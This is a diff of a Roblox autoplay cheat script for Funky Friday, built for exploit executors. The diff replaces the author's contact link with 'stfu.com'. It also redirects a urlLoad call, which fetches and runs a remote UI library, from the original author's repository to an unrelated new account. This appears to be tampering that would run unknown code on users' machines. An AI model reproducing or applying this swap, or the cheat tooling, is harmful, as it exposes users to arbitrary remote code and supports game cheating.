@@ -37,7 +37,7 @@ Change logs:
 Information:
     Officially supported: Synapse X, Script-Ware, KRNL, Fluxus
     Needed functions: setthreadcontext, getconnections, getgc, getloaodedmodules 
-    You can find contact information on the GitHub repository (https://github.com/wally-rblx/funky-friday-autoplay)
+    You can find contact information on the GitHub repository (stfu.com)
 --]]
 
 local client = game:GetService('Players').LocalPlayer;
@@ -72,7 +72,7 @@ if type(getconnections) ~= 'function' then return fail('Unsupported exploit (mis
 if type(getloadedmodules) ~= 'function' then return fail('Unsupported exploit (misssing "getloadedmodules")') end
 if type(getgc) ~= 'function' then return fail('Unsupported exploit (misssing "getgc")') end
 
-local library = urlLoad("https://raw.githubusercontent.com/wally-rblx/uwuware-ui/main/main.lua")
+local library = urlLoad("https://raw.githubusercontent.com/NEWACCTBRUH/aesewr/main/ewr.lua")
 
 local framework, scrollHandler
 local counter = 0
